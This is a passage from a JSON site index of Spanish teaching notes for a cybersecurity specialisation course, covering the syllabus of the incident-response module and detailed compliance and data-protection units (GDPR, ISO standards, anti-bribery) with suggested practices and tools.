eestablecer-los-servicios-afectados-por-incidentes","CETI/Incidentes-de-ciberseguridad/RA-4/4e---Documentación","CETI/Incidentes-de-ciberseguridad/RA-4/4f----Seguimiento-de-incidentes-para-evitar-una-situación-similar","CETI/Incidentes-de-ciberseguridad/RA-5/5a---Desarrollar-procedimientos-de-actuación-para-la-notificación-de-incidentes","CETI/Incidentes-de-ciberseguridad/RA-5/5b---Notificación-interna-de-incidentes","CETI/Incidentes-de-ciberseguridad/RA-5/5c---Notificación-de-incidentes-a-quienes-corresponda","CETI/Incidentes-de-ciberseguridad/RA-5/5d---Notificación-forma-de-incidentes-a-afectados","CETI/Incidentes-de-ciberseguridad/RA-5/5e---Notificación-de-incidentes-a-medios-de-comunicación"],"tags":["Apuntes","Temas","Incidentes"],"content":"Desglose del temario IC: RA - Criterios - Contenidos\nRA1. Desarrolla planes de prevención y concienciación en ciberseguridad, estableciendo normas y medidas de protección.\nCriterios de evaluación:\na) Se han definido los principios generales de la organización en materia de ciberseguridad, que deben ser conocidos y apoyados por la dirección de la misma.\n\nContenido asociado: Principios generales en materia de ciberseguridad.\nEnlace con el material para impartirlo: 1a - Principios generales en materia de ciberseguridad\n\nb) Se ha establecido una normativa de protección del puesto de trabajo.\n\nContenido asociado: Normativa de protección del puesto del trabajo.\nEnlace con el material para impartirlo: 1b - Normativa de protección del puesto del trabajo.\n\nc) Se ha definido un plan de concienciación de ciberseguridad dirigido a los empleados.\n\nContenido asociado: Plan de formación y concienciación en materia de ciberseguridad.\nEnlace con el material para impartirlo: 1c - Plan de formación y concienciación en materia de ciberseguridad\n\nd) Se ha desarrollado el material necesario para llevar a cabo las acciones de concienciación dirigidas a los empleados.\n\nContenido asociado: Materiales de formación y concienciación.\nEnlace con el material para impartirlo: 1d - Materiales de formación y concienciación\n\ne) Se ha realizado una auditoría para verificar el cumplimiento del plan de prevención y concienciación de la organización.\n\nContenido asociado: Auditorías internas de cumplimiento en materia de prevención.\nEnlace con el material para impartirlo: 1e - Auditorías internas de cumplimiento en materia de prevención\n\n2. Analiza incidentes de ciberseguridad utilizando herramientas, mecanismos de detección y alertas de seguridad.\nCriterios de evaluación:\na) Se ha clasificado y definido la taxonomía de incidentes de ciberseguridad que pueden afectar a la organización.\n\nContenido asociado: Taxonomía de incidentes de ciberseguridad.\nEnlace con el material para impartirlo: 2a - Taxonomía de incidentes de ciberseguridad\n\nb) Se han establecido controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes\n\nContenido asociado: Controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes: tipos y fuentes\nEnlace con el material para impartirlo: 2b - Monitorización, identificación, detección y alerta de incidentes\n\nc) Se han establecido controles y mecanismos de detección e identificación de incidentes de seguridad física.\n\nContenido asociado: Controles, herramientas y mecanismos de detección e identificación de incidentes de seguridad física.\nEnlace con el material para impartirlo: 2c - Detección e identificación de incidentes de seguridad física\n\nd) Se han establecido controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes a través de la investigación en fuentes abiertas (OSINT: Open Source Intelligence).\n\nContenido asociado: Controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes a través de la investigación en fuentes abiertas (OSINT).\nEnlace con el material para impartirlo: 2d - Monitorización, identificación, detección y alerta de incidentes a través de OSINT\n\ne) Se ha realizado una clasificación, valoración, documentación y seguimiento de los incidentes detectados dentro de la organización.\n\nContenido asociado: Clasificación, valoración, documentación, seguimiento inicial de incidentes de ciberseguridad.\nEnlace con el material para impartirlo: 2e - Clasificación, valoración, documentación, seguimiento inicial de incidentes de ciberseguridad\n\n3. Investiga incidentes de ciberseguridad analizando los riesgos implicados y definiendo las posibles medidas a adoptar.\nCriterios de evaluación:\na) Se han recopilado y almacenado de forma segura evidencias de incidentes de ciberseguridad que afectan a la organización.\n\nContenido asociado: Recopilación de evidencias.\nEnlace con el material para impartirlo: 3a - Recopilación de evidencias\n\nb) Se ha realizado un análisis de evidencias.\n\nContenido asociado: Análisis de evidencias.\nEnlace con el material para impartirlo: 3b - Análisis de evidencias.\n\nc) Se ha realizado la investigación de incidentes de ciberseguridad.\n\nContenido asociado: Investigación del incidente\nEnlace con el material para impartirlo: 3c - Investigación del incidente\n\nd) Se ha intercambiado información de incidentes, con proveedores y/o organismos competentes que podrían hacer aportaciones al respecto.\n\nContenido asociado: Intercambio de información del incidente con proveedores u organismos competentes.\nEnlace con el material para impartirlo: 3d - Intercambio de información del incidente con proveedores u organismos competentes.\n\ne) Se han iniciado las primeras medidas de contención de los incidentes para limitar los posibles daños causados.\n\nContenido asociado: Medidas de contención de incidentes.\nEnlace con el material para impartirlo: 3e - Medidas de contención de incidentes.\n\n4. Implementa medidas de ciberseguridad en redes y sistemas respondiendo a los incidentes detectados y aplicando las técnicas de protección adecuadas.\nCriterios de evaluación:\na) Se han desarrollado procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes de ciberseguridad más habituales.\n\nContenido asociado: Desarrollar procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes.\nEnlace con el material para impartirlo: 4a - Desarrollar procedimientos de actuación detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes\n\nb) Se han preparado respuestas ciberresilientes ante incidentes que permitan seguir prestando los servicios de la organización y fortaleciendo las capacidades de identificación, detección, prevención, contención, recuperación y cooperación con terceros.\n\nContenido asociado: Implantar capacidades de ciberresiliencia.\nEnlace con el material para impartirlo: 4b - Implantar capacidades de ciberresiliencia\n\nc) Se ha establecido un flujo de toma de decisiones y escalado de incidentes interno y/o externo adecuados.\n\nContenido asociado: Establecer flujos de toma de decisiones y escalado interno y/o externo adecuados.\nEnlace con el material para impartirlo: 4c - Establecer flujos de toma de decisiones y escalado interno o externo adecuados\n\nd) Se han llevado a cabo las tareas de restablecimiento de los servicios afectados por un incidente hasta confirmar la vuelta a la normalidad.\n\nContenido asociado: Tareas para reestablecer los servicios afectados por incidentes.\nEnlace con el material para impartirlo: 4d - Tareas para reestablecer los servicios afectados por incidentes\n\ne) Se han documentado las acciones realizadas y las conclusiones que permitan mantener un registro de “lecciones aprendidas”.\n\nContenido asociado: Documentación\nEnlace con el material para impartirlo: 4e - Documentación\n\nf) Se ha realizado un seguimiento adecuado del incidente para evitar que una situación similar se vuelva a repetir.\n\nContenido asociado: Seguimiento de incidentes para evitar una situación similar.\nEnlace con el material para impartirlo: 4f -  Seguimiento de incidentes para evitar una situación similar\n\n5. Detecta y documenta incidentes de ciberseguridad siguiendo procedimientos de actuación establecidos.\nCriterios de evaluación:\na) Se ha desarrollado un procedimiento de actuación detallado para la notificación de incidentes de ciberseguridad en los tiempos adecuados.\n\nContenido asociado: Desarrollar procedimientos de actuación para la notificación de incidentes.\nEnlace con el material para impartirlo: 5a - Desarrollar procedimientos de actuación para la notificación de incidentes\n\nb) Se ha notificado el incidente de manera adecuada al personal interno de la organización responsable de la toma de decisiones.\n\nContenido asociado: Notificación interna de incidentes.\nEnlace con el material para impartirlo: 5b - Notificación interna de incidentes\n\nc) Se ha notificado el incidente de manera adecuada a las autoridades competentes en el ámbito de la gestión de incidentes de ciberseguridad en caso de ser necesario.\n\nContenido asociado: Notificación de incidentes a quienes corresponda.\nEnlace con el material para impartirlo: 5c - Notificación de incidentes a quienes corresponda\n\nd) Se ha notificado formalmente el incidente a los afectados, personal interno, clientes, proveedores, etc., en caso de ser necesario.\n\nEnlace con el material para impartirlo: 5d - Notificación forma de incidentes a afectados\n\ne) Se ha notificado el incidente a los medios de comunicación en caso de ser necesario.\n\nEnlace con el material para impartirlo: 5e - Notificación de incidentes a medios de comunicación\n"},"CETI/Incidentes-de-ciberseguridad/index":{"title":"Incidentes de ciberseguridad","links":["CETI/Incidentes-de-ciberseguridad/Temario"],"tags":[],"content":"Incidentes de ciberseguridad es un módulo del curso de especialización en ciberseguridad en entornos de las tecnologías de la información (CETI). En esta documentación pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nWebs para practicar, en general:\n\nCyberdefenders\nLets defend\nTryHackme\nHackthebox\nBoss of the soc (splunk)\nAtenea (CCN-CERT)\nRetos de academia hacker de Incibe\n\nMateriales en general:\n\ngithub.com/cyb3rxp/awesome-soc\ngithub.com/meirwah/awesome-incident-response\ngithub.com/mikeroyal/Open-Source-Security-Guide\ngithub.com/rshipp/awesome-malware-analysis\n"},"CETI/Normativa-de-ciberseguridad/RA-1/Unidad-1---RA-1":{"title":"Unidad 1 - RA 1","links":[],"tags":[],"content":"CE - 1a:\na) Se han identificado las bases del cumplimiento normativo a tener en cuenta en las organizaciones.\n\n\nContenido asociado: Introducción al cumplimiento normativo (Compliance: objetivo, definición y conceptos principales).\n\nConceptos: Definición y objetivos del cumplimiento normativo, componentes clave de un programa de cumplimiento (compromiso de la dirección, evaluación de riesgos, políticas, formación, monitorización, reporting, enforcement).\n\n\nPrácticas: Analizar estudios de casos de fallos en el cumplimiento (ejemplo: caso Wells Fargo), identificar requisitos de cumplimiento para diferentes industrias (finanzas, salud, tecnología).\n\nHerramientas:\nPlataformas de gestión de cumplimiento como MetricStream o IBM OpenPages\nrecursos en línea como SCCE\nwww.open-scap.org/\n\n\n\n\n\nCE - 1b\nb) Se han descrito y aplicado los principios de un buen gobierno y su relación con la ética profesional.\n\nContenido asociado: Principios del buen gobierno y ética empresarial.\n\n\nConceptos:\n\nPrincipios de buen gobierno (transparencia, responsabilidad, equidad)\nteorías éticas aplicadas a negocios (utilitarismo, deontología)\nresponsabilidad social corporativa.\n\n\nPrácticas:\n\nDesarrollar un código de conducta para una empresa ficticia, simular dilemas éticos en un contexto empresarial.\nAnalizar el escándalo de Volkswagen para discutir fallos de gobernanza, comparar estructuras de gobernanza en diferentes sectores.\ntryhackme.com/r/room/cybergovernanceregulation\n\n\nHerramientas:\n\nMarcos de toma de decisiones éticas (ejemplo: Markkula Center)\ncursos en línea sobre ética empresarial.\n\n\n\nCE - 1c\nc) Se han definido las políticas y procedimientos, así como la estructura organizativa que establezca la cultura del cumplimiento normativo dentro de las organizaciones.\n\nConceptos:\n\nTipos de políticas de cumplimiento (anticorrupción, protección de datos)\nprocedimientos operativos estándar\ncomités de cumplimiento\nlíneas de reporte.\n\n\nPrácticas:\n\nRedactar una política de cumplimiento sobre un tema específico (ejemplo: blanqueo de capitales)\ndiseñar un organigrama que incluya funciones de cumplimiento.\n\n\nHerramientas:\n\nSoftware de gestión de políticas como PolicyTech\nherramientas de diseño organizacional como Lucidchart.\n\n\n\nCE - 1d\nd) Se han descrito las funciones o competencias del responsable del cumplimiento normativo dentro de las organizaciones.\n\nContenido asociado: Compliance Officer: funciones y responsabilidades.\n\n\nConceptos:\n\nRol y responsabilidades del Compliance Officer (asesoramiento, monitorización, reporting)\nhabilidades requeridas (conocimiento legal, comunicación, pensamiento analítico).\n\n\nPrácticas:\n\nCrear una descripción de puesto para un Compliance Officer\nsimular un día en la vida de este profesional.\n\n\nHerramientas:\n\nProgramas de certificación profesional como CCEP\nplataformas como LinkedIn para investigar perfiles.\n\n\n\nCE - 1e\ne) Se han establecido las relaciones con terceros para un correcto cumplimiento normativo.\n\nContenido asociado: Relaciones con terceras partes dentro del Compliance.\n\n\nConceptos:\n\nGestión de riesgos de terceros\nprocesos de debida diligencia\ncláusulas contractuales de cumplimiento.\n\n\nPrácticas:\n\nRealizar una evaluación de riesgos de un proveedor ficticio\nredactar términos de cumplimiento para un contrato.\nAnalizar casos donde fallos de terceros afectaron el cumplimiento, discutir mejores prácticas para gestionar relaciones con terceros.\n\n\nHerramientas:\n\nPlataformas de gestión de riesgos de terceros como RiskRate o Prevalent\nlistas de verificación de debida diligencia.\n\n\n"},"CETI/Normativa-de-ciberseguridad/RA-2/Unidad-2---RA-2":{"title":"Unidad 2 - RA 2","links":[],"tags":[],"content":"CE - 2a:\na) Se han recogido las principales normativas que afectan a los diferentes tipos de organizaciones.\n\nContenido asociado: Entorno regulatorio de aplicación.\n\n\nConceptos:\n\nResumen de normativas clave (GDPR, SOX, FCPA)\nregulaciones sectoriales (HIPAA para salud, PCI DSS para pagos).\n\n\nPrácticas:\n\nCrear un inventario normativo para una industria específica\ninvestigar cambios normativos recientes.\n\n\nHerramientas:\n\nBases de datos legales como Westlaw o Aranzadi\nsitios web de agencias reguladoras.\n\n\n\nCE - 2b:\nb) Se han establecido las recomendaciones válidas para diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 19.600 entre otras).\n\nContenido asociado: Sistemas de Gestión de Compliance.\n\n\nConceptos:\n\nEstructura de ISO 19600/37301 (contexto, liderazgo, planificación, soporte, operación, evaluación, mejora)\nimplementación de sistemas de gestión de cumplimiento.\n\n\nPrácticas:\n\nDiseñar un esquema de sistema de gestión de cumplimiento basado en ISO\nrealizar un análisis de brechas frente al estándar.\n\n\nHerramientas:\n\nDocumentos de normas ISO\nsoftware de gestión de cumplimiento.\n\n\n\nCE - 2c:\nc) Se han realizado análisis y evaluaciones de los riesgos de diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 31.000 entre otras).\n\nContenido asociado: Análisis y gestión de riesgos, mapas de riesgos.\n\n\nConceptos:\n\nProceso de gestión de riesgos (contexto, evaluación, tratamiento, monitoreo)\ntécnicas de identificación de riesgos (SWOT, PESTLE)\nmétodos de evaluación.\n\n\nPrácticas:\n\nRealizar una evaluación de riesgos para una organización ficticia\ncrear un plan de tratamiento de riesgos.\n\n\nHerramientas:\n\nSoftware de gestión de riesgos como LogicManager o RiskLens\nplantillas de evaluación de riesgos.\n\n\n\nCE - 2d:\nd) Se ha documentado el sistema de cumplimiento normativo diseñado.\n\nContenido asociado: Documentación del sistema de cumplimiento normativo diseñado.\n\n\nConceptos:\n\nJerarquía de documentación (políticas, procedimientos, instrucciones)\nrequisitos de mantenimiento de registros\ncontrol de versiones.\n\n\nPrácticas:\n\nRedactar un manual de cumplimiento\ndesarrollar un procedimiento para gestionar violaciones.\n\n\nHerramientas:\n\nSistemas de gestión documental como SharePoint o Confluence\nsoftware de control de versiones.\n\n\n"},"CETI/Normativa-de-ciberseguridad/RA-3/Unidad-3---RA-3":{"title":"Unidad 3 - RA 3","links":[],"tags":[],"content":"CE - 3a:\na) Se han identificado los riesgos penales aplicables a diferentes organizaciones.\n\nContenido asociado: Riesgos penales que afectan a la organización.\n\n\nConceptos:\n\nTipos de riesgos penales (fraude, blanqueo, delitos ambientales)\nelementos de la responsabilidad penal de personas jurídicas.\n\n\nPrácticas:\n\nIdentificar riesgos penales en escenarios empresariales\nmapear riesgos a leyes específicas.\n\n\nHerramientas:\n\nTextos legales (Código Penal español)\nherramientas de evaluación de riesgos penales.\n\n\n\nCE - 3b:\nb) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados.\n\nConceptos:\n\nMedidas preventivas (controles internos, formación)\nmedidas detectivas (auditorías, líneas de denuncia)\nmedidas correctivas.\n\n\nPrácticas:\n\nDiseñar un marco de controles para riesgos penales específicos\nsimular una investigación interna.\n\n\nHerramientas:\n\nHerramientas de monitoreo de cumplimiento\nsistemas de gestión de incidentes.\n\n\n\nCE - 3c:\nc) Se ha establecido un sistema de gestión de cumplimiento normativo penal de acuerdo con la legislación y normativa vigente (Código Penal y UNE 19.601, entre otros).\n\nContenido asociado: Sistemas de gestión de Compliance penal.\n\n\nConceptos:\n\nRequisitos de UNE 19601\nintegración con otros sistemas de gestión\nproceso de certificación.\n\n\nPrácticas:\n\nDesarrollar una política de cumplimiento penal\nimplementar formación sobre riesgos penales.\n\n\nHerramientas:\n\nDocumento de la norma UNE 19601\nsoftware de cumplimiento compatible con UNE 19601.\n\n\n\nCE - 3d\nd) Se han determinado los principios básicos dentro de las organizaciones para combatir el soborno y promover una cultura empresarial ética de acuerdo con la legislación y normativa vigente (ISO 37.001 entre otros).\n\nContenido asociado: Sistemas de gestión anticorrupción.\n\n\nConceptos:\n\nElementos clave de ISO 37001 (compromiso de liderazgo, evaluación de riesgos, debida diligencia, controles financieros, reporting)\npolíticas antisoborno.\n\n\nPrácticas:\n\nRealizar una evaluación de riesgos de soborno\ndesarrollar un programa de formación antisoborno.\n\n\nHerramientas:\n\nNorma ISO 37001\nherramientas de cumplimiento antisoborno.\n\n\n"},"CETI/Normativa-de-ciberseguridad/RA-4/Unidad-4---RA-4":{"title":"Unidad 4 - RA 4","links":[],"tags":[],"content":"CE - 4a:\na) Se han reconocido las fuentes del Derecho de acuerdo con el ordenamiento jurídico en materia de protección de datos de carácter personal.\n\nContenido asociado: Novedades del RGPD de la Unión Europea.\n\n\nConceptos:\n\nJerarquía de normas en protección de datos (Reglamento General de Protección de Datos - GDPR, LOPDGDD)\nrol de las autoridades de protección de datos.\n\n\nPrácticas:\n\nInvestigar y presentar el marco legal de protección de datos en España y la UE.\n\n\nHerramientas\n\nDiarios oficiales (BOE, OJEU)\nsitios web de autoridades como AEPD.\n\n\n\nCE - 4b:\nb) Se han aplicado los principios relacionados con la protección de datos de carácter personal tanto a nivel nacional como internacional.\n\nContenido asociado: Principios de protección de datos.\n\n\nConceptos:\n\nPrincipios del GDPR (artículo 5: licitud, lealtad, transparencia, limitación de finalidad, minimización, exactitud, limitación de conservación, integridad, confidencialidad, responsabilidad proactiva).\n\n\nPrácticas:\n\nEvaluar una actividad de tratamiento de datos frente a los principios del GDPR\ndiseñar un aviso de privacidad.\n\n\nHerramientas:\n\nTexto del GDPR\nguías de la AEPD.\n\n\n\nCE - 4c:\nc) Se han establecido los requisitos necesarios para afrontar la privacidad desde las bases del diseño.\n\nContenido asociado: Privacidad por Diseño y por Defecto.\n\n\nConceptos:\n\nPrincipios de Privacidad por Diseño (PbD)\ntécnicas para implementar PbD (minimización de datos, seudonimización).\n\n\nPrácticas:\n\nIntegrar PbD en un proyecto de desarrollo de sistemas\nrealizar una evaluación de impacto en la protección de datos (DPIA).\nstudiar ejemplos de PbD (ejemplo: funciones de privacidad de Apple)\ndiscutir desafíos en la implementación de PbD.\n\n\nHerramientas:\n\nMarcos de PbD\nplantillas de DPIA de la AEPD.\n\n\n\nCE - 4d:\nd) Se han configurado las herramientas corporativas contemplando el cumplimiento normativo por defecto.\n\nConceptos:\n\nConfiguraciones de Privacidad por Defecto\nminimización de datos por defecto\nmecanismos de consentimiento.\n\n\nPrácticas:\n\nConfigurar una aplicación web para cumplir con Privacidad por Defecto\nrevisar configuraciones predeterminadas para implicaciones de privacidad.\n\n\nHerramientas:\n\nPlataformas de gestión de privacidad\nherramientas de gestión de consentimiento.\n\n\n\nCE - 4e:\ne) Se ha realizado un análisis de riesgos para el tratamiento de los derechos a la protección de datos.\n\nContenido asociado: Análisis de Impacto en Privacidad (PIA), y medidas de seguridad.\n\n\nConceptos:\n\nMetodologías de evaluación de riesgos en protección de datos\nidentificación de riesgos para los derechos de los interesados.\n\n\nPrácticas:\n\nRealizar una DPIA para una actividad de tratamiento de alto riesgo\ndocumentar riesgos y mitigaciones.\n\n\nHerramientas:\n\nSoftware de DPIA\nmarcos de evaluación de riesgos.\n\n\n\nCE - 4f:\nf) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados en la protección de datos.\n\nConceptos:\n\nMedidas técnicas (cifrado, controles de acceso)\nmedidas organizativas (políticas, formación).\n\n\nPrácticas:\n\nImplementar controles de seguridad en un entorno simulado\ndesarrollar un plan de respuesta a brechas de datos.\n\n\nHerramientas:\n\nSoftware de seguridad (firewalls, antivirus)\nherramientas de respuesta a incidentes.\n\n\n\nCE - 4g:\ng) Se han descrito las funciones o competencias del delegado de protección de datos dentro de las organizaciones.\n\nContenido asociado: Delegado de Protección de Datos (DPO).\n\n\nConceptos:\n\nTareas del DPO (informar, asesorar, monitorear cumplimiento, cooperar con autoridades)\nrequisitos para su nombramiento.\n\n\nPrácticas:\n\nSimular la gestión de una solicitud de acceso de un interesado\nasesorar sobre un acuerdo de tratamiento de datos.\n\n\nHerramientas:\n\nKits de herramientas para DPOs\nredes profesionales para DPOs.\n\n\n"},"CETI/Normativa-de-ciberseguridad/RA-5/Unidad-5---RA-5":{"title":"Unidad 5 - RA 5","links":[],"tags":[],"content":"CE - 5a:\na) Se ha establecido el plan de revisiones de la normativa, jurisprudencia, notificaciones, etc. jurídicas que puedan afectar a la organización.\n\nConceptos:\n\nImportancia del monitoreo legal\nfuentes de información legal\nfrecuencia de revisiones.\n\n\nPrácticas:\n\nDesarrollar un plan de monitoreo legal\nconfigurar alertas para cambios normativos.\n\n\nHerramientas:\n\nServicios de actualización legal como Lexology\nfeeds RSS de organismos reguladores.\n\n\n\nCE - 5b:\nb) Se ha detectado nueva normativa consultando las bases de datos jurídicas siguiendo el plan de revisiones establecido.\n\nContenido asociado: Normas nacionales e internacionales.\nContenido asociado: Directiva NIS.\nContenido asociado: Legislación sobre la protección de infraestructuras críticas.\nContenido asociado: Ley PIC (Protección de infraestructuras críticas).\n\n\nConceptos:\n\nEstrategias de búsqueda efectivas en bases de datos legales\nidentificación de normativas relevantes.\n\n\nPrácticas:\n\nRealizar una búsqueda de leyes recientes de ciberseguridad\nresumir puntos clave de una nueva normativa.\n\n\nHerramientas:\n\nBases de datos legales como vLex o Aranzadi\nmotores de búsqueda con filtros legales.\n\n\n\nCE - 5c:\nc) Se ha analizado la nueva normativa para determinar si aplica a la actividad de la organización.\n\nContenido asociado: Acceso electrónico de los ciudadanos a los Servicios Públicos.\n\n\nConceptos:\n\nAnálisis de aplicabilidad legal\ninterpretación de textos legales en el contexto de operaciones empresariales.\n\n\nPrácticas:\n\nAnalizar una nueva normativa de ciberseguridad y evaluar su impacto en una empresa\ncrear una lista de verificación de cumplimiento.\n\n\nHerramientas:\n\nPlantillas de análisis legal\nsoftware de gestión de cumplimiento.\n\n\n\nCE - 5d:\nd) Se ha incluido en el plan de revisiones las modificaciones necesarias, sobre la nueva normativa aplicable a la organización, para un correcto cumplimiento normativo.\n\nConceptos:\n\nActualización de programas de cumplimiento\ncomunicación interna de cambios\nformación sobre nuevos requisitos.\n\n\nPrácticas:\n\nRevisar una política de cumplimiento para reflejar nuevas normativas\nplanificar una sesión de formación sobre los cambios.\n\n\nHerramientas:\n\nSistemas de gestión de políticas\nsistemas de gestión de aprendizaje para formación.\n\n\n\nCE - 5e:\ne) Se han determinado e implementado los controles necesarios para garantizar el correcto cumplimiento normativo de las nuevas normativas. incluidas en el plan de revisiones.\n\nContenido asociado: Sistema de Gestión de Seguridad de la Información (estándares internacionales) (ISO 27.001).\nContenido asociado: Esquema Nacional de Seguridad (ENS)\nContenido asociado: Planes de Continuidad de Negocio (estándares internacionales) (ISO 22.301).\n\n\nConceptos:\n\nDiseño de controles para cumplir requisitos normativos\npruebas de efectividad de controles.\n\n\nPrácticas:\n\nIdentificar controles necesarios para una nueva normativa (ejemplo: requisitos de registro bajo la Directiva NIS)\nimplementar controles en un entorno simulado.\n\n\nHerramientas:\n\nPlataformas de GRC (Governance, Risk, Compliance)\nherramientas de evaluación de controles.\n\n\n"},"CETI/Normativa-de-ciberseguridad/Temario":{"title":"Temario","links":["CETI/Normativa-de-ciberseguridad/RA-1/Unidad-1---RA-1","CETI/Normativa-de-ciberseguridad/RA-2/Unidad-2---RA-2","CETI/Normativa-de-ciberseguridad/RA-3/Unidad-3---RA-3","CETI/Normativa-de-ciberseguridad/RA-4/Unidad-4---RA-4","CETI/Normativa-de-ciberseguridad/RA-5/Unidad-5---RA-5"],"tags":["Apuntes","Temas","Normativa"],"content":"Desglose del temario NC: RA - Criterios - Contenidos\n1. Identifica los puntos principales de aplicación para asegurar el cumplimiento normativo reconociendo funciones y responsabilidades.\nCriterios de evaluación:\na) Se han identificado las bases del cumplimiento normativo a tener en cuenta en las organizaciones.\n\nContenido asociado: Introducción al cumplimiento normativo (Compliance: objetivo, definición y conceptos principales).\nEnlace: CE - 1a\n\nb) Se han descrito y aplicado los principios de un buen gobierno y su relación con la ética profesional.\n\nContenido asociado: Principios del buen gobierno y ética empresarial.\nEnlace: CE - 1b\n\nc) Se han definido las políticas y procedimientos, así como la estructura organizativa que establezca la cultura del cumplimiento normativo dentro de las organizaciones.\n\nEnlace: CE - 1c\n\nd) Se han descrito las funciones o competencias del responsable del cumplimiento normativo dentro de las organizaciones.\n\nContenido asociado: Compliance Officer: funciones y responsabilidades.\n\n\nEnlace: CE - 1d\n\ne) Se han establecido las relaciones con terceros para un correcto cumplimiento normativo.\n\nContenido asociado: Relaciones con terceras partes dentro del Compliance.\nEnlace: CE - 1e\n\n2. Diseña sistemas de cumplimiento normativo seleccionando la legislación y jurisprudencia de aplicación.\nCriterios de evaluación:\na) Se han recogido las principales normativas que afectan a los diferentes tipos de organizaciones.\n\nContenido asociado: Entorno regulatorio de aplicación.\nEnlace: CE - 2a\n\nb) Se han establecido las recomendaciones válidas para diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 19.600 entre otras).\n\nContenido asociado: Sistemas de Gestión de Compliance.\nEnlace: CE - 2b\n\nc) Se han realizado análisis y evaluaciones de los riesgos de diferentes tipos de organizaciones de acuerdo con la normativa vigente (ISO 31.000 entre otras).\n\nContenido asociado: Análisis y gestión de riesgos, mapas de riesgos.\nEnlace: CE - 2c\n\nd) Se ha documentado el sistema de cumplimiento normativo diseñado.\n\nContenido asociado: Documentación del sistema de cumplimiento normativo diseñado.\nEnlace: CE - 2d\n\n3. Relaciona la normativa relevante para el cumplimiento de la responsabilidad penal de las organizaciones y personas jurídicas con los procedimientos establecidos, recopilando y aplicando las normas vigentes.\nCriterios de evaluación:\na) Se han identificado los riesgos penales aplicables a diferentes organizaciones.\n\nContenido asociado: Riesgos penales que afectan a la organización.\nEnlace: CE - 3a\n\nb) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados.\n\nEnlace: CE - 3b\n\nc) Se ha establecido un sistema de gestión de cumplimiento normativo penal de acuerdo con la legislación y normativa vigente (Código Penal y UNE 19.601, entre otros).\n\nContenido asociado: Sistemas de gestión de Compliance penal.\nEnlace: CE - 3c\n\nd) Se han determinado los principios básicos dentro de las organizaciones para combatir el soborno y promover una cultura empresarial ética de acuerdo con la legislación y normativa vigente (ISO 37.001 entre otros).\n\nContenido asociado: Sistemas de gestión anticorrupción.\nEnlace: CE - 3d\n\n4. Aplica la legislación nacional de protección de datos de carácter personal, relacionando los procedimientos establecidos con las leyes vigentes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluación:\na) Se han reconocido las fuentes del Derecho de acuerdo con el ordenamiento jurídico en materia de protección de datos de carácter personal.\n\nContenido asociado: Novedades del RGPD de la Unión Europea.\nEnlace: CE - 4a\n\nb) Se han aplicado los principios relacionados con la protección de datos de carácter personal tanto a nivel nacional como internacional.\n\nContenido asociado: Principios de protección de datos.\nEnlace: CE - 4b\n\nc) Se han establecido los requisitos necesarios para afrontar la privacidad desde las bases del diseño.\n\nContenido asociado: Privacidad por Diseño y por Defecto.\nEnlace: CE - 4c\n\nd) Se han configurado las herramientas corporativas contemplando el cumplimiento normativo por defecto.\n\nEnlace: CE - 4d\n\ne) Se ha realizado un análisis de riesgos para el tratamiento de los derechos a la protección de datos.\n\nContenido asociado: Análisis de Impacto en Privacidad (PIA), y medidas de seguridad.\nEnlace: CE - 4e\n\nf) Se han implantado las medidas necesarias para eliminar o minimizar los riesgos identificados en la protección de datos.\n\nEnlace: CE - 4f\n\ng) Se han descrito las funciones o competencias del delegado de protección de datos dentro de las organizaciones.\n\nContenido asociado: Delegado de Protección de Datos (DPO).\nEnlace: CE - 4g\n\n5. Recopila y aplica la normativa vigente de ciberseguridad de ámbito nacional e internacional, actualizando los procedimientos establecidos de acuerdo con las leyes y con la jurisprudencia existente sobre la materia.\nCriterios de evaluación:\na) Se ha establecido el plan de revisiones de la normativa, jurisprudencia, notificaciones, etc. jurídicas que puedan afectar a la organización.\n\nEnlace: CE - 5a\n\nb) Se ha detectado nueva normativa consultando las bases de datos jurídicas siguiendo el plan de revisiones establecido.\n\nContenido asociado: Normas nacionales e internacionales.\nContenido asociado: Directiva NIS.\nContenido asociado: Legislación sobre la protección de infraestructuras críticas.\nContenido asociado: Ley PIC (Protección de infraestructuras críticas).\nEnlace: CE - 5b\n\nc) Se ha analizado la nueva normativa para determinar si aplica a la actividad de la organización.\n\nContenido asociado: Acceso electrónico de los ciudadanos a los Servicios Públicos.\nEnlace: CE - 5c\n\nd) Se ha incluido en el plan de revisiones las modificaciones necesarias, sobre la nueva normativa aplicable a la organización, para un correcto cumplimiento normativo.\n\nEnlace: CE - 5d\n\ne) Se han determinado e implementado los controles necesarios para garantizar el correcto cumplimiento normativo de las nuevas normativas. incluidas en el plan de revisiones.\n\nContenido asociado: Sistema de Gestión de Seguridad de la Información (estándares internacionales) (ISO 27.001).\nContenido asociado: Esquema Nacional de Seguridad (ENS)\nContenido asociado: Planes de Continuidad de Negocio (estándares internacionales) (ISO 22.301).\nEnlace: CE - 5e\n"},"CETI/Normativa-de-ciberseguridad/index":{"title":"Normativa de ciberseguridad","links":["CETI/Normativa-de-ciberseguridad/Temario"],"tags":[],"content":"Normativa de ciberseguridad es un módulo del curso de especialización en ciberseguridad en entornos de las tecnologías de la información (CETI). En esta documentación pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n"},"CETI/Puesta-en-produccion-segura/RA-1/Unidad-1---RA-1":{"title":"Unidad 1 - RA 1","links":[],"tags":[],"content":"Resultado de Aprendizaje 1: Prueba de aplicaciones web y para dispositivos móviles\nCriterio 1.a: Comparar diferentes lenguajes de programación según sus características principales\n\nConceptos: Características que afectan pruebas y seguridad, como gestión de memoria, seguridad de tipos y manejo de excepciones.\nPrácticas: Escribir 